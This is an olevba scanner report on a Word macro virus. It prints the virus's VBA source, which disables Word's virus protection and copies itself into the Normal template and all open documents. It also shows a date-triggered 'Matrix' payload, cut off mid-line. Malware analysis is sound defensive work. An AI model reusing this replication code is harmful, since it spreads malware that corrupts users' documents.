olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-ff727f4491c42e278308539cb1169ebfb0737594
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-ff727f4491c42e278308539cb1169ebfb0737594 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Sub Document_Open()
'Mat1'
   On Error Resume Next
   Application.Options.VirusProtection = False
   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Mat1'" Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   End If
   
   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines _
   1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines _
   (1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
   End If
   
   If NormalTemplate.Saved = False Then NormalTemplate.Save
   
   For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Mat1'" Then
        Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines _
        1, Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines _
        1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines _
        (1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
   Next k
End Sub

Private Sub Document_Close()
    Dim result As Long
    Dim name As String
    Document_Open
    If (Day(Now()) = 13) Or (Day(Now()) = 26) Then
        mys = "Enter your name, User"
        m = "Matrix"
        MsgBox "Attention! Do everything, your computer tells you!", ok + vbCritical, "Matrix"
        name = InputBox(mys,                                                                                                                                                                       
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

